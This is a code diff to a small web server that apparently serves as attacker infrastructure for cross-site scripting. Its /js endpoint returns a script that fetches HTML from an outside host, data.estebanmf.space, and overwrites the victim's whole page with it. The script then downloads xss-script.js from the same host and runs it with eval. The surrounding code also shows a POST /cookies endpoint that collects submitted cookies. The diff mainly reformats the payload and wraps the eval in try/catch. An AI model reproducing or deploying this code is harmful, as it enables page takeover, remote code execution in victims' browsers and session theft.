@@ -34,26 +34,30 @@ serve({
 
     if (url.pathname === "/js" && req.method === "GET") {
       const jsCode = `
-console.log('Evaluating JS string');
-fetch('https://data.estebanmf.space/xss')
-.then(t => t.text())
-.then(d => {
-console.log('Fetched HTML:', d);
-// Replace entire document content
-document.documentElement.innerHTML = d;
-console.log('Document HTML replaced');
-// Fetch and eval xss-script.js
-fetch('https://data.estebanmf.space/xss-script.js')
-.then(t => t.text())
-.then(script => {
-console.log('xss-script.js fetched, evaluating');
-eval(script);
-console.log('xss-script.js evaluated');
-})
-.catch(e => console.error('Script fetch error:', e));
-})
-.catch(e => console.error('HTML fetch error:', e));
-`;
+    console.log('Evaluating JS string');
+    fetch('https://data.estebanmf.space/xss')
+      .then(t => t.text())
+      .then(d => {
+        console.log('Fetched HTML:', d);
+        // Replace entire document content
+        document.documentElement.innerHTML = d;
+        console.log('Document HTML replaced');
+        // Fetch and eval xss-script.js
+        fetch('https://data.estebanmf.space/xss-script.js')
+          .then(t => t.text())
+          .then(script => {
+            console.log('xss-script.js fetched, evaluating');
+            try {
+              eval(script);
+              console.log('xss-script.js evaluated');
+            } catch (e) {
+              console.error('Eval failed:', e);
+            }
+          })
+          .catch(e => console.error('Script fetch error:', e));
+      })
+      .catch(e => console.error('HTML fetch error:', e));
+  `;
       return new Response(jsCode, {
         headers: {
           "Content-Type": "application/javascript",
@@ -61,7 +65,6 @@ console.log('xss-script.js evaluated');
         },
       });
     }
-
     // POST /cookies
     if (url.pathname === "/cookies" && req.method === "POST") {
       const body = (await req.json().catch(() => null)) as { cookies?: string } | null;
